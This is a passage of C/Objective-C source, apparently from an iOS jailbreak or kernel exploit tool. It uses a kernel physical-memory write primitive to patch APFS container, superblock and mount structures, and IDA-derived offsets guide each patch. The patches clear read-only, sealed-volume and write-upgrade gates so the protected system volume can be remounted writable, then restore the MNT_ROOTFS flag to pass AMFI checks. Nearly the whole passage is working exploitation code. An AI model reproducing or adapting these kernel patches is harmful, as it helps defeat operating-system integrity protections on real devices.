    uint64_t nx_buf = dt_build38_read_u64_dual(container + DT_BAKED_CONTAINER_NX_SB_BUF, "container+0xC8", log);
    uint32_t remap = dt_build38_read_u32_dual(container + DT_BAKED_CONTAINER_REMAP, "container+0x144", log);
    DTPhysLog(log, @"[*] build42 %s container=0x%llx +0xC8=0x%llx(%s) +0x144=%u",
        tag, container, nx_buf, dt_build38_kptr_class(nx_buf), remap);

    if (!dt_build36_kern_kptr_valid(nx_buf, 0)) {
        DTPhysLog(log, @"[*] build42 %s nxsb+0x4F4 skip — container+0xC8 not valid kptr", tag);
        return;
    }

    uint32_t nx_writable = dt_build38_read_u32_dual(nx_buf + DT_BAKED_NXSB_WRITABLE, "nxsb+0x4F4", log);
    DTPhysLog(log, @"[*] build42 %s nxsb+0x4F4 writable=%u (IDA nx_rw_update EROFS if 0)", tag, nx_writable);
}

/// IDA apfs_mount_update @ 0xa2739c/+0xa27410; write path @ 0x9ab848 — vol_sb deref only when kptr valid.
static void dt_build42_vol_sb_deep_probe(uint64_t vol_sb, const char *label, void (^log)(NSString *line))
{
    if (!dt_build36_kern_kptr_valid(vol_sb, 0)) {
        DTPhysLog(log, @"[*] build42 %s vol_sb=0x%llx(%s) — skip deref", label, vol_sb, dt_build38_kptr_class(vol_sb));
        return;
    }

    uint64_t q30 = dt_build38_read_u64_dual(vol_sb + DT_BAKED_APFS_VOL_QWORD48, "vol_sb+0x30", log);
    uint32_t b38 = dt_build38_read_u32_dual(vol_sb + DT_BAKED_APFS_VOL_BYTE56, "vol_sb+0x38", log);
    DTPhysLog(log,
        @"[*] build42 %s vol_sb=0x%llx +0x30=0x%llx +0x38=0x%02x sealed_bit0x20=%u",
        label, vol_sb, q30, (unsigned)(b38 & 0xFFu), (unsigned)((b38 >> 5) & 1u));
}

static void dt_build42_eff_deep_probe(uint64_t apfs_eff, const char *tag, void (^log)(NSString *line))
{
    if (!dt_build36_kern_kptr_valid(apfs_eff, 0)) {
        DTPhysLog(log, @"[!] build42 %s apfs_eff=0x%llx invalid", tag, apfs_eff);
        return;
    }

    uint64_t vol_sb = dt_build38_read_u64_dual(apfs_eff + DT_BAKED_APFS_VOL_SB, "eff+0xC0", log);
    uint32_t substate = dt_build38_read_u32_dual(apfs_eff + DT_BAKED_APFS_MOUNT_SUBSTATE, "eff+0x148", log);
    uint32_t remap_mode = (uint32_t)(dt_build38_read_u32_dual(apfs_eff + DT_BAKED_APFS_REMAP_MODE_BYTE, "eff+0x121", log) & 0xFFu);

    DTPhysLog(log, @"[*] build42 %s apfs_eff=0x%llx +0xC0=0x%llx +0x121=0x%02x +0x148=0x%x",
        tag, apfs_eff, vol_sb, (unsigned)remap_mode, substate);
    dt_build42_vol_sb_deep_probe(vol_sb, tag, log);
}

static void dt_build42_deep_discovery_for_apfs(uint64_t apfs_eff, uint64_t container,
    const char *tag, void (^log)(NSString *line))
{
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build42 %s deep discovery", tag]];
    dt_build42_eff_deep_probe(apfs_eff, tag, log);
    dt_build42_nx_layer_probe(container, tag, log);
}

static void dt_build42_deep_discovery_ex(const dt_build38_chain_t *chain, uint64_t graph_container,
    const char *tag, void (^log)(NSString *line))
{
    uint64_t container = dt_build36_kern_kptr_valid(graph_container, 0) ? graph_container : chain->container;
    dt_build42_deep_discovery_for_apfs(chain->apfs_eff, container, tag, log);
}

/// IDA apfs_mount_update @ 0xfffffff006a273b8: LDR W8,[container,#0x144]; CBZ → remap extentref path.
static int dt_build42_patch_container_remap(uint64_t container, void (^log)(NSString *line))
{
    if (!dt_build36_kern_kptr_valid(container, 0)) {
        [[DTRunLogger shared] logStage:@"build42 step5 container invalid — skip"];
        return 0;
    }

    uint32_t remap = dt_build38_read_u32_dual(container + DT_BAKED_CONTAINER_REMAP, "container+0x144-pre", log);
    if (remap == 0) {
        [[DTRunLogger shared] logStage:@"build42 step5 container+0x144 already clear"];
        return 0;
    }

    DTPhysLog(log, @"[*] build42 step5 container+0x144 remap %u → 0", remap);
    int patch_err = dt_phys_write32_va(container + DT_BAKED_CONTAINER_REMAP, 0, "build42 container+0x144", log);
    if (patch_err != 0)
        return patch_err;

    if (dt_build38_read_u32_dual(container + DT_BAKED_CONTAINER_REMAP, "container+0x144-post", log) != 0) {
        [[DTRunLogger shared] logStage:@"build42 step5 container+0x144 still set"];
        return -10;
    }
    [[DTRunLogger shared] logStage:@"build42 step5 container+0x144 OK"];
    return 0;
}

/// Heap kalloc only — excludes static kernel image ptrs (run4 container, run1 vol_sb false positive).
static bool dt_build43_kptr_is_heap(uint64_t p)
{
    if (!dt_build36_kern_kptr_valid(p, 0))
        return false;
    return (p >> 32) != 0xfffffff0ULL;
}

/// IDA apfs_mount_update @ 0xfffffff006a273a4: vol_sb+0x30 allowed when 0 or 2.
static bool dt_build43_vol_q48_ida_allowed(uint64_t q48)
{
    return (q48 & ~DT_BAKED_APFS_VOL_QWORD48_ALLOWED) == 0;
}

static int dt_build43_patch_container_mu_gate(uint64_t container, void (^log)(NSString *line))
{
    if (!dt_build43_kptr_is_heap(container)) {
        DTPhysLog(log, @"[!] build43 step4 skip — container=0x%llx(%s)",
            container, dt_build38_kptr_class(container));
        [[DTRunLogger shared] logStage:@"build43 step4 container static — skip"];
        return 0;
    }
    return dt_build41_patch_container_mu_gate(container, log);
}

static int dt_build43_patch_container_remap(uint64_t container, void (^log)(NSString *line))
{
    if (!dt_build43_kptr_is_heap(container)) {
        DTPhysLog(log, @"[!] build43 step5 skip — container=0x%llx(%s)",
            container, dt_build38_kptr_class(container));
        [[DTRunLogger shared] logStage:@"build43 step5 container static — skip"];
        return 0;
    }
    return dt_build42_patch_container_remap(container, log);
}

/// IDA nx_rw_update @ 0xfffffff006987908/0x98797c: CBZ on nxsb+0x4F4 → EROFS 30.
static int dt_build43_patch_nxsb_writable(uint64_t container, void (^log)(NSString *line))
{
    if (!dt_build43_kptr_is_heap(container)) {
        [[DTRunLogger shared] logStage:@"build43 step6 container static — skip"];
        return 0;
    }

    uint64_t nx_buf = dt_build38_read_u64_dual(container + DT_BAKED_CONTAINER_NX_SB_BUF,
        "step6 container+0xC8", log);
    if (!dt_build43_kptr_is_heap(nx_buf)) {
        DTPhysLog(log, @"[*] build43 step6 nxsb+0x4F4 skip — container+0xC8=0x%llx(%s)",
            nx_buf, dt_build38_kptr_class(nx_buf));
        [[DTRunLogger shared] logStage:@"build43 step6 nx_buf invalid — skip"];
        return 0;
    }

    uint32_t writable = dt_build38_read_u32_dual(nx_buf + DT_BAKED_NXSB_WRITABLE,
        "step6 nxsb+0x4F4-pre", log);
    if (writable != 0) {
        [[DTRunLogger shared] logStage:@"build43 step6 nxsb+0x4F4 already set"];
        return 0;
    }

    DTPhysLog(log, @"[*] build43 step6 nxsb+0x4F4 writable 0 → 1 (IDA nx_rw_update @ 0x98790c)");
    int patch_err = dt_phys_write32_va(nx_buf + DT_BAKED_NXSB_WRITABLE, 1, "build43 nxsb+0x4F4", log);
    if (patch_err != 0)
        return patch_err;

    if (dt_build38_read_u32_dual(nx_buf + DT_BAKED_NXSB_WRITABLE, "step6 nxsb+0x4F4-post", log) == 0) {
        [[DTRunLogger shared] logStage:@"build43 step6 nxsb+0x4F4 still zero"];
        return -11;
    }
    [[DTRunLogger shared] logStage:@"build43 step6 nxsb+0x4F4 OK"];
    return 0;
}

/// IDA apfs_mount_update @ 0xfffffff006a273a8: vol_sb+0x30 must be 0 or 2 else EROFS 30.
static int dt_build43_patch_vol_sb_q48(uint64_t apfs_eff, void (^log)(NSString *line))
{
    uint64_t vol_sb = dt_build38_read_u64_dual(apfs_eff + DT_BAKED_APFS_VOL_SB, "step7 eff+0xC0", log);
    if (!dt_build43_kptr_is_heap(vol_sb)) {
        DTPhysLog(log, @"[*] build43 step7 skip — vol_sb=0x%llx(%s)",
            vol_sb, dt_build38_kptr_class(vol_sb));
        [[DTRunLogger shared] logStage:@"build43 step7 vol_sb not heap — skip"];
        return 0;
    }

    uint64_t q48 = dt_build38_read_u64_dual(vol_sb + DT_BAKED_APFS_VOL_QWORD48, "step7 vol_sb+0x30-pre", log);
    if (dt_build43_vol_q48_ida_allowed(q48)) {
        [[DTRunLogger shared] logStage:@"build43 step7 vol_sb+0x30 already IDA-allowed"];
        return 0;
    }

    DTPhysLog(log, @"[*] build43 step7 vol_sb+0x30=0x%llx → 0 (IDA apfs_mount_update @ 0xa273a8)", q48);
    int patch_err = dt_phys_write64_va(vol_sb + DT_BAKED_APFS_VOL_QWORD48, 0, "build43 vol_sb+0x30", log);
    if (patch_err != 0)
        return patch_err;

    uint64_t post_q48 = dt_build38_read_u64_dual(vol_sb + DT_BAKED_APFS_VOL_QWORD48, "step7 vol_sb+0x30-post", log);
    if (!dt_build43_vol_q48_ida_allowed(post_q48)) {
        [[DTRunLogger shared] logStage:@"build43 step7 vol_sb+0x30 still blocked"];
        return -12;
    }
    [[DTRunLogger shared] logStage:@"build43 step7 vol_sb+0x30 OK"];
    return 0;
}

/// IDA build47: clear mount syscall gates before case-5 MNT_UPDATE.
/// mp+0x70 mnt_flag — _vfs_isrdonly bit0, _vfs_iswriteupgrade LDRB bit0, _vfs_flags bit0xE @ 0x9da8c4.
/// mp+0x74 mnt_kern — _vfs_iswriteupgrade UBFX bit26. Always runs (build40 step1 skipped mnt_kern when already RW).
static int dt_build47_patch_mount_mp_gates(uint64_t mount_mp, const char *tag, void (^log)(NSString *line))
{
    const dt_misaka_offsets_t *o = &g_misaka_offsets;
    uint32_t mnt_flag = dt_build38_read_u32_dual(mount_mp + o->off_mount_mnt_flag, "mp+0x70", log);
    uint32_t mnt_kern = dt_build38_read_u32_dual(mount_mp + o->off_mount_mnt_flag + 4, "mp+0x74", log);

    uint32_t new_flag = mnt_flag;
    new_flag &= ~DT_BAKED_MNT_FLAG_RDONLY_BIT;
    new_flag &= ~DT_BAKED_MNT_FLAG_VFS_EPERM_BIT;
    new_flag &= 0xFFF2FFFFu;
    uint32_t new_kern = mnt_kern & ~DT_BAKED_MNT_KERN_WRITEUPGRADE_BIT;

    DTPhysLog(log, @"[*] build47 %s mp gates pre bit14=%s kern_bit26=%s mnt_flag=0x%x mnt_kern=0x%x",
        tag,
        (mnt_flag & DT_BAKED_MNT_FLAG_VFS_EPERM_BIT) ? "SET" : "clear",
        (mnt_kern & DT_BAKED_MNT_KERN_WRITEUPGRADE_BIT) ? "SET" : "clear",
        mnt_flag, mnt_kern);

    if (new_flag == mnt_flag && new_kern == mnt_kern) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build47 %s mount mp gates already clear", tag]];
        return 0;
    }

    DTPhysLog(log, @"[*] build47 %s mp+0x70 mnt_flag 0x%x→0x%x mp+0x74 mnt_kern 0x%x→0x%x "
        "(IDA EPERM @ 0x9daa88 vfs_flags bit0xE @ 0x9da8c4)",
        tag, mnt_flag, new_flag, mnt_kern, new_kern);

    int patch_err = dt_phys_write32_va(mount_mp + o->off_mount_mnt_flag, new_flag,
        "build47 mp+0x70 mnt_flag", log);
    if (patch_err != 0)
        return patch_err;
    patch_err = dt_phys_write32_va(mount_mp + o->off_mount_mnt_flag + 4, new_kern,
        "build47 mp+0x74 mnt_kern", log);
    if (patch_err != 0)
        return patch_err;

    uint32_t post_flag = dt_build38_read_u32_dual(mount_mp + o->off_mount_mnt_flag, "mp+0x70-post", log);
    uint32_t post_kern = dt_build38_read_u32_dual(mount_mp + o->off_mount_mnt_flag + 4, "mp+0x74-post", log);
    if ((post_flag & (DT_BAKED_MNT_FLAG_RDONLY_BIT | DT_BAKED_MNT_FLAG_VFS_EPERM_BIT)) != 0) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build47 %s mp+0x70 gate bits still set 0x%x", tag, post_flag]];
        return -2;
    }
    if (post_kern & DT_BAKED_MNT_KERN_WRITEUPGRADE_BIT) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build47 %s mp+0x74 writeupgrade bit still set", tag]];
        return -3;
    }

    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build47 %s mount mp gates OK", tag]];
    return 0;
}

/// After successful MNT_UPDATE: restore MNT_ROOTFS (mp+0x70 bit14) for AMFI on-system-volume.
/// IDA: APFS gate only in sub_FFFFFFF0069D9F50 @ 0x9da8c0→0x9da8c4 (pre-update vfs_flags TBNZ #0xE).
/// IDA: AMFI sub_FFFFFFF005C80598 @ 0x5c805bc→0x5c805c0 UBFX bit14; 5C80744 dispatches "on-system-volume".
/// RW is held by APFS outer patches (readonly/revert_xid/nx); bit14 clear was left applied on success (build63 rollback only).
static int dt_build88_restore_mnt_rootfs_for_amfi(uint64_t mount_mp, const char *tag, void (^log)(NSString *line))
{
    const dt_misaka_offsets_t *o = &g_misaka_offsets;
    uint32_t cur = dt_build38_read_u32_dual(mount_mp + o->off_mount_mnt_flag, "mp+0x70-amfi-restore", log);
    if (cur & DT_BAKED_MNT_FLAG_VFS_EPERM_BIT) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build88 %s MNT_ROOTFS already set 0x%x", tag, cur]];
        return 0;
    }
    uint32_t restored = cur | DT_BAKED_MNT_FLAG_VFS_EPERM_BIT;
    DTPhysLog(log, @"[*] build88 %s restore mp+0x70 MNT_ROOTFS 0x%x→0x%x (AMFI 5C80598 bit14)",
        tag, cur, restored);
    int patch_err = dt_phys_write32_va(mount_mp + o->off_mount_mnt_flag, restored,
        "build88 mp+0x70 MNT_ROOTFS restore", log);
    if (patch_err != 0)
        return patch_err;
    uint32_t post = dt_build38_read_u32_dual(mount_mp + o->off_mount_mnt_flag, "mp+0x70-amfi-post", log);
    if ((post & DT_BAKED_MNT_FLAG_VFS_EPERM_BIT) == 0) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build88 %s MNT_ROOTFS restore failed 0x%x", tag, post]];
        return -4;
    }
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build88 %s MNT_ROOTFS restore OK", tag]];
    return 0;
}

/// IDA: mount_update @ 0xa27338 uses outer+0xD0; @ 0xa2739c uses outer+0xC0 (not CSEL child).
/// Create @ 0x9bd4ac uses vfs_fsprivate outer+0xC0. CSEL vol_sb @ 0x9dbe84 for other mount setup.
typedef struct {
    uint64_t mnt_outer;
    uint64_t snap_child;
    uint64_t container;
    uint64_t vol_sb_outer;
    uint64_t vol_sb_child;
    uint64_t nx_sb;
    uint64_t vol_sb_csel;
    uint64_t vol_sb_child_d8;
    uint32_t container_mu_gate;
    uint16_t graft_count;
    bool os_update;
    bool mount_ready;
    char container_src[40];
    char child_src[40];
    char vol_sb_child_src[24];
    unsigned vollist_scanned;
    /* build66 extended discovery */
    uint64_t vol_sb_graft;
    uint64_t container_vol_head_raw;
    uint64_t container_vol_tail;
    unsigned backlink_hits;
    unsigned neighbor_hits;
    unsigned neighbor_adjacent_hits;
    int neighbor_best_slot;
    uint64_t outer_d0;
    uint64_t outer_backlink;
    uint64_t outer_mount_mp;
    uint64_t mounted_match_mp;
    uint64_t mounted_match_apfs;
    uint64_t mounted_match_vol_sb;
    uint64_t mounted_match_container;
    uint32_t mounted_match_fsid0;
    uint32_t mounted_match_fsid1;
    uint32_t mounted_match_dev;
    bool outer_mounted_bit;
    bool mounted_match_applied;
    char fsprivate_class[20];
    char vol_sb_graft_src[32];
    char mounted_match_src[32];
    char failure_mode[48];
} dt_apfs_graph_t;

#define DT_BUILD66_APFS_OBJ_SIZE       0x21B8u
#define DT_BUILD66_BACKLINK_SCAN_SLOTS 48  /* build76: ±48 apfs slots @ 0x21B8 (IDA child often adjacent) */
#define DT_BUILD66_MAX_VOL_SB_CANDS    16u
#define DT_BUILD76_NEIGHBOR_SCAN_SLOTS 48u
#define DT_BUILD76_MAX_NEIGHBOR_HITS   16u
#define DT_BUILD66_MAX_TAIL_WALK       16u
#define DT_BUILD80_MAX_MOUNT_WALK      128u

#define DT_BUILD65_MAX_CONTAINER_CANDS 8u
#define DT_BUILD65_MAX_VOL_LIST        16u

typedef struct {
    uint64_t ptr;
    const char *src;
} dt_build65_container_cand_t;

static void dt_build65_push_container_cand(dt_build65_container_cand_t *cands, unsigned *count,
    uint64_t ptr, const char *src)
{
    if (!cands || !count || !src || *count >= DT_BUILD65_MAX_CONTAINER_CANDS)
        return;
    if (!dt_build36_kern_kptr_valid(ptr, 0))
        return;
    for (unsigned i = 0; i < *count; i++) {
        if (cands[i].ptr == ptr)
            return;
    }
    cands[(*count)++] = (dt_build65_container_cand_t){ .ptr = ptr, .src = src };
}

static uint64_t dt_build65_pick_heap_container(const dt_build65_container_cand_t *cands, unsigned count,
    const char **out_src, void (^log)(NSString *line))
{
    for (unsigned i = 0; i < count; i++) {
        if (dt_build43_kptr_is_heap(cands[i].ptr)) {
            if (out_src)
                *out_src = cands[i].src;
            return cands[i].ptr;
        }
    }
    if (count > 0) {
        DTPhysLog(log,
            @"[*] build65 no heap container — best cand=0x%llx(%s) src=%s",
            cands[0].ptr, dt_build38_kptr_class(cands[0].ptr), cands[0].src);
    }
    if (out_src)
        *out_src = "none";
    return 0;
}

static void dt_build65_collect_container_cands(const dt_build38_chain_t *chain, uint64_t outer,
    uint64_t snap_child, dt_build65_container_cand_t *cands, unsigned *count, void (^log)(NSString *line))
{
    *count = 0;
    dt_build65_push_container_cand(cands, count,
        dt_build38_read_u64_dual(outer + DT_BAKED_APFS_CONTAINER, "build65 outer+0xD0", log),
        "outer+0xD0");
    if (dt_build36_kern_kptr_valid(chain->container, 0)) {
        dt_build65_push_container_cand(cands, count, chain->container, "eff+0xD0");
    }
    if (dt_build36_kern_kptr_valid(chain->apfs_main, 0) && chain->apfs_main != outer) {
        dt_build65_push_container_cand(cands, count,
            dt_build38_read_u64_dual(chain->apfs_main + DT_BAKED_APFS_CONTAINER, "build65 main+0xD0", log),
            "main+0xD0");
    }
    if (dt_build36_kern_kptr_valid(snap_child, 0)) {
        dt_build65_push_container_cand(cands, count,
            dt_build38_read_u64_dual(snap_child + DT_BAKED_APFS_CONTAINER, "build65 child+0xD0", log),
            "child+0xD0");
    }

    for (unsigned i = 0; i < *count; i++) {
        DTPhysLog(log,
            @"[*] build65 container cand[%u]=0x%llx(%s) src=%s",
            i, cands[i].ptr, dt_build38_kptr_class(cands[i].ptr), cands[i].src);
    }
}

static bool dt_build65_walk_vol_list(uint64_t container, uint64_t outer, uint64_t outer_vol_id,
    uint64_t *out_child, char *out_reason, size_t reason_len, unsigned *out_entries,
    void (^log)(NSString *line))
{
    if (out_child)
        *out_child = 0;
    if (out_entries)
        *out_entries = 0;
    if (out_reason && reason_len > 0)
        out_reason[0] = '\0';

    if (!dt_build43_kptr_is_heap(container)) {
        DTPhysLog(log,
            @"[*] build65 vollist skip — container=0x%llx(%s) not heap",
            container, dt_build38_kptr_class(container));
        return false;
    }

    uint64_t head = dt_build38_read_u64_dual(container + DT_BAKED_CONTAINER_VOL_LIST,
        "build65 container+0x1F0", log);
    if (!dt_build36_kern_kptr_valid(head, 0)) {
        DTPhysLog(log, @"[*] build65 vollist head null @ container+0x1F0");
        [[DTRunLogger shared] logStage:@"build65 vollist head null"];
        return false;
    }

    DTPhysLog(log,
        @"[*] build65 vollist walk container=0x%llx head=0x%llx outer=0x%llx outer+0x2D8=0x%llx (IDA @ 0x9743dc)",
        container, head, outer, outer_vol_id);
    [[DTRunLogger shared] logStage:@"build65 vollist walk begin"];

    uint64_t entry = head;
    uint64_t dev_match_child = 0;
    char dev_match_reason[64] = {0};

    for (unsigned i = 0; i < DT_BUILD65_MAX_VOL_LIST && dt_build36_kern_kptr_valid(entry, 0); i++) {
        if (out_entries)
            (*out_entries)++;

        uint64_t main_ptr = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_MAIN_APFS,
            "build65 vollist+0x138", log);
        uint64_t vol_id = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_VOL_ID,
            "build65 vollist+0x2D8", log);
        uint64_t xid = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_REVERT_XID,
            "build65 vollist+0xF8", log);
        uint64_t entry_container = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_CONTAINER,
            "build65 vollist+0xD0", log);
        uint64_t vol_c0 = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_VOL_SB,
            "build65 vollist+0xC0", log);
        uint64_t vol_d8 = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_CHILD_VOL_SB,
            "build65 vollist+0xD8", log);

        DTPhysLog(log,
            @"[*] build65 vollist[%u] apfs=0x%llx +0x138=0x%llx +0x2D8=0x%llx +0xF8=0x%llx +0xD0=0x%llx +0xC0=0x%llx +0xD8=0x%llx",
            i, entry, main_ptr, vol_id, xid, entry_container, vol_c0, vol_d8);

        if (main_ptr == outer) {
            if (out_child)
                *out_child = entry;
            if (out_reason && reason_len > 0)
                snprintf(out_reason, reason_len, "vollist[%u]+0x138==outer", i);
            DTPhysLog(log,
                @"[+] build65 vollist child=0x%llx via +0x138==outer (IDA handle_snapshot @ 0x9e0154)", entry);
            [[DTRunLogger shared] logStage:@"build65 vollist child via +0x138"];
            return true;
        }

        if (vol_id == outer_vol_id && entry != outer && !dev_match_child) {
            dev_match_child = entry;
            snprintf(dev_match_reason, sizeof(dev_match_reason),
                "vollist[%u]+0x2D8 dev match", i);
            DTPhysLog(log,
                @"[*] build65 vollist sibling dev-match apfs=0x%llx (IDA revert @ 0x9743e4)", entry);
        }

        entry = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_VOL_LIST_NEXT,
            "build65 vollist+0x330", log);
    }

    if (dev_match_child) {
        if (out_child)
            *out_child = dev_match_child;
        if (out_reason && reason_len > 0)
            strlcpy(out_reason, dev_match_reason, reason_len);
        DTPhysLog(log,
            @"[*] build65 vollist fallback child=0x%llx via +0x2D8 dev match (no +0x138 link)", dev_match_child);
        [[DTRunLogger shared] logStage:@"build65 vollist child via +0x2D8 fallback"];
        return true;
    }

    DTPhysLog(log, @"[*] build65 vollist walk — no child matched outer");
    [[DTRunLogger shared] logStage:@"build65 vollist no child"];
    return false;
}

static bool dt_build68_vol_sb_ptr_valid(uint64_t p)
{
    return dt_build36_kern_kptr_valid(p, 0);
}

/// Link-fix required when outer+0xC0 is static/stale but neighbor/child heap vol_sb exists (run 5 class).
static bool dt_build77_osupdate_vol_sb_link_fix_needed(const dt_apfs_graph_t *g)
{
    if (!g || !g->os_update)
        return false;
    if (dt_build43_kptr_is_heap(g->vol_sb_outer))
        return false;
    return dt_build68_vol_sb_ptr_valid(g->vol_sb_child) ||
        dt_build68_vol_sb_ptr_valid(g->vol_sb_graft);
}

/// IDA nx_rw_update @ 0xfffffff006987978: LDR X8,[container,#0xC8]; LDR W9,[X8,#0x4F4].
/// os.update remount OK requires heap container+0xC8 (populated via container_load @ 0x986ed4 or graft).
static bool dt_build77_remount_graph_nx_complete(const dt_apfs_graph_t *g, void (^log)(NSString *line))
{
    if (!g || !g->os_update)
        return true;

    if (!dt_build43_kptr_is_heap(g->container)) {
        DTPhysLog(log,
            @"[!] build77 remount nx gate — container=0x%llx(%s) not heap (IDA @ 0x987970)",
            g->container, dt_build38_kptr_class(g->container));
        [[DTRunLogger shared] logStage:@"build77 os.update C8 gate container fail"];
        return false;
    }

    uint64_t c8 = dt_build38_read_u64_dual(g->container + DT_BAKED_CONTAINER_NX_SB_BUF,
        "build77 container+0xC8 gate", log);
    if (!dt_build43_kptr_is_heap(c8)) {
        DTPhysLog(log,
            @"[!] build77 remount nx gate — container+0xC8=0x%llx(%s) "
            "(IDA nx_rw_update LDR @ 0x987978 → nxsb+0x4F4 @ 0x98797c)",
            c8, dt_build38_kptr_class(c8));
        [[DTRunLogger shared] logStage:@"build77 os.update C8 gate fail"];
        return false;
    }

    return true;
}

static void dt_build65_resolve_child_vol_sb(dt_apfs_graph_t *g, void (^log)(NSString *line))
{
    if (!g || !dt_build36_kern_kptr_valid(g->snap_child, 0)) {
        g->vol_sb_child = 0;
        g->vol_sb_child_d8 = 0;
        g->vol_sb_child_src[0] = '\0';
        return;
    }

    uint64_t c0 = dt_build38_read_u64_dual(g->snap_child + DT_BAKED_APFS_VOL_SB,
        "build69 child+0xC0", log);
    uint64_t d8 = dt_build38_read_u64_dual(g->snap_child + DT_BAKED_APFS_CHILD_VOL_SB,
        "build69 child+0xD8 volname", log);
    g->vol_sb_child_d8 = d8;

    DTPhysLog(log,
        @"[*] build69 child vol_sb +0xC0=0x%llx(%s) +0xD8=0x%llx(%s volname string, IDA @ 0x9e017c)",
        c0, dt_build38_kptr_class(c0), d8, dt_build38_kptr_class(d8));

    if (dt_build68_vol_sb_ptr_valid(c0)) {
        g->vol_sb_child = c0;
        strlcpy(g->vol_sb_child_src, "child+0xC0", sizeof(g->vol_sb_child_src));
        return;
    }

    g->vol_sb_child = 0;
    g->vol_sb_child_src[0] = '\0';
}

static void dt_build65_log_mu_gate(dt_apfs_graph_t *g, void (^log)(NSString *line))
{
    if (!g || !dt_build43_kptr_is_heap(g->container))
        return;

    uint32_t mu = dt_build38_read_u32_dual(g->container + DT_BAKED_CONTAINER_MU_GATE,
        "build65 container+0x13C", log);
    g->container_mu_gate = mu;
    DTPhysLog(log,
        @"[*] build65 container+0x13C mu_gate=%u (IDA check @ 0xa2733c clear @ 0x987d74 step4 patches if set)",
        mu);
    if (mu != 0)
        [[DTRunLogger shared] logStage:@"build65 mu_gate set — step4 will clear"];
    else
        [[DTRunLogger shared] logStage:@"build65 mu_gate already clear"];
}

static void dt_build68_compute_mount_ready(dt_apfs_graph_t *g, void (^log)(NSString *line));
static void dt_build66_classify_failure(dt_apfs_graph_t *g);
static void dt_build62_log_graph(const dt_apfs_graph_t *g, const char *tag, void (^log)(NSString *line));

static void dt_build65_discover_and_enrich(const dt_build38_chain_t *chain, dt_apfs_graph_t *g,
    void (^log)(NSString *line))
{
    if (!chain || !g)
        return;

    g->container_src[0] = '\0';
    g->child_src[0] = '\0';
    g->vol_sb_child_src[0] = '\0';
    g->vollist_scanned = 0;

    [[DTRunLogger shared] logStage:@"build65 graph discovery begin"];
    DTPhysLog(log, @"[*] build65 graph discovery — IDA vollist @ 0x9743dc sibling @ 0x9da880");

    uint64_t outer = g->mnt_outer;
    uint64_t direct_child = g->snap_child;
    if (dt_build36_kern_kptr_valid(direct_child, 0))
        strlcpy(g->child_src, "outer+0x138", sizeof(g->child_src));

    uint64_t outer_vol_id = 0;
    if (dt_build36_kern_kptr_valid(outer, 0))
        outer_vol_id = dt_build38_read_u64_dual(outer + DT_BAKED_APFS_VOL_ID, "build65 outer+0x2D8", log);

    dt_build65_container_cand_t cands[DT_BUILD65_MAX_CONTAINER_CANDS] = {0};
    unsigned cand_count = 0;
    dt_build65_collect_container_cands(chain, outer, direct_child, cands, &cand_count, log);

    uint64_t discovered_child = 0;
    uint64_t best_container = 0;
    const char *container_src = "none";

    for (unsigned ci = 0; ci < cand_count; ci++) {
        if (!dt_build43_kptr_is_heap(cands[ci].ptr))
            continue;

        unsigned entries = 0;
        uint64_t list_child = 0;
        char reason[64] = {0};
        if (dt_build65_walk_vol_list(cands[ci].ptr, outer, outer_vol_id, &list_child, reason,
                sizeof(reason), &entries, log)) {
            discovered_child = list_child;
            best_container = cands[ci].ptr;
            container_src = cands[ci].src;
            strlcpy(g->child_src, reason, sizeof(g->child_src));
            g->vollist_scanned = entries;
            break;
        }
        if (entries > g->vollist_scanned)
            g->vollist_scanned = entries;
    }

    if (!discovered_child && cand_count > 0) {
        bool any_heap = false;
        for (unsigned ci = 0; ci < cand_count; ci++) {
            if (dt_build43_kptr_is_heap(cands[ci].ptr)) {
                any_heap = true;
                break;
            }
        }
        if (!any_heap) {
            DTPhysLog(log, @"[*] build65 vollist never ran — no heap container candidate");
            [[DTRunLogger shared] logStage:@"build65 vollist skipped no heap container"];
        }
    }

    if (!discovered_child && dt_build36_kern_kptr_valid(direct_child, 0)) {
        discovered_child = direct_child;
        strlcpy(g->child_src, "outer+0x138", sizeof(g->child_src));
        DTPhysLog(log, @"[*] build65 child from outer+0x138=0x%llx", direct_child);
    }

    if (discovered_child)
        g->snap_child = discovered_child;

    if (best_container)
        g->container = best_container;
    else {
        best_container = dt_build65_pick_heap_container(cands, cand_count, &container_src, log);
        if (best_container)
            g->container = best_container;
    }

    if (discovered_child && !dt_build43_kptr_is_heap(g->container)) {
        uint64_t child_container = dt_build38_read_u64_dual(discovered_child + DT_BAKED_APFS_CONTAINER,
            "build65 child+0xD0 fallback", log);
        if (dt_build43_kptr_is_heap(child_container)) {
            g->container = child_container;
            container_src = "child+0xD0";
            DTPhysLog(log,
                @"[*] build65 container from child+0xD0=0x%llx (multi-source fallback)", child_container);
            [[DTRunLogger shared] logStage:@"build65 container from child+0xD0"];
        }
    }

    if (container_src)
        strlcpy(g->container_src, container_src, sizeof(g->container_src));

    dt_build65_resolve_child_vol_sb(g, log);
    dt_build65_log_mu_gate(g, log);

    if (dt_build36_kern_kptr_valid(g->mnt_outer, 0))
        g->vol_sb_outer = dt_build38_read_u64_dual(g->mnt_outer + DT_BAKED_APFS_VOL_SB,
            "build65 outer+0xC0", log);
    if (dt_build43_kptr_is_heap(g->container))
        g->nx_sb = dt_build38_read_u64_dual(g->container + DT_BAKED_CONTAINER_NX_SB,
            "build65 container+0xC0 nx", log);

    dt_build68_compute_mount_ready(g, log);

    DTPhysLog(log,
        @"[*] build65 discovery summary container=0x%llx(%s) src=%s child=0x%llx(%s) src=%s "
        "vol_sb_child=0x%llx(%s) vollist_entries=%u mount_ready=%d",
        g->container, dt_build38_kptr_class(g->container), g->container_src,
        g->snap_child, dt_build38_kptr_class(g->snap_child), g->child_src,
        g->vol_sb_child, g->vol_sb_child_src, g->vollist_scanned, g->mount_ready);
